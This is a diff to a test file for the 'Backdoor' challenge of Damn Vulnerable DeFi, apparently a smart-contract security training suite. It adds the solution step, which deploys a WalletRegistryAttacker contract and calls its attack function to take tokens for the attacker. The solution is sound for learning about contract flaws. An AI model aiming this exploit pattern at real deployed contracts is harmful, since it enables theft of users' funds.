@@ -37,6 +37,18 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // https://medium.com/@balag3/damn-vulnerable-defi-walkthrough-part-two-challenge-7-12-a64c42c82c5b
+        this.timeout(20000);
+        this.token.provider.pollingInterval = 1;
+        /** CODE YOUR EXPLOIT HERE */
+        this.attackerContract  = await (await ethers.getContractFactory('WalletRegistryAttacker', attacker)).deploy(
+            this.walletFactory.address,
+            this.walletRegistry.address,
+            this.masterCopy.address,
+            this.token.address
+        );
+
+        await this.attackerContract.connect(attacker).attack(this.token.address, attacker.address, users);
     });
 
     after(async function () {
